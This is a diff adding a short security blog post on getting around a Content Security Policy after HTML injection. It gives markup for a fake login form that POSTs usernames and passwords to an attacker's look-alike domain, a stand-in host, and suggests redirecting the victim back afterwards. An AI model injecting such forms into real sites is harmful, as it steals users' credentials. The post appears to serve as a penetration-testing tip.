@@ -1,0 +1,30 @@
+---
+creation_epoch: 1621527461
+lastmod_epoch: 1621527461
+categories: ['Security']
+title: Bypassing CSP XSS Protection
+---
+
+<p>
+Ever have a vulnerable web application where you can inject HTML tags but the Content Security Policy (CSP) prevents your JavaScript from running? Sometimes you can work around the CSP but other times it is very well defined and blocks any malicious code.
+</p>
+
+<h3>
+Bypass Solution
+</h3>
+
+<p>
+Since you can get HTML tags injected consider using an HTML form with CSS styling to impersonate the login page. The trick is to not use any JavaScript but point the form submission action to a malicious server you host for capturing login submissions. You could even then redirect back after that to make it look like the login was successful.
+</p>
+
+<pre>
+&lt;div style=&quot;height: 100%&quot;&gt;
+&lt;form method=&quot;POST&quot; action=&quot;https://my.look-alike-domain.example.com/login.cgi&quot;&gt;
+	&lt;label&gt;Username:&lt;/label&gt;
+	&lt;input type=&quot;text&quot; name=&quot;username&quot; /&gt;&lt;br /&gt;
+	&lt;label&gt;Password:&lt;/label&gt;
+	&lt;input type=&quot;password&quot; name=&quot;password&quot; /&gt;&lt;br /&gt;
+	&lt;input type=&quot;submit&quot; /&gt;
+&lt;/form&gt;
+&lt;/div&gt;
+</pre>
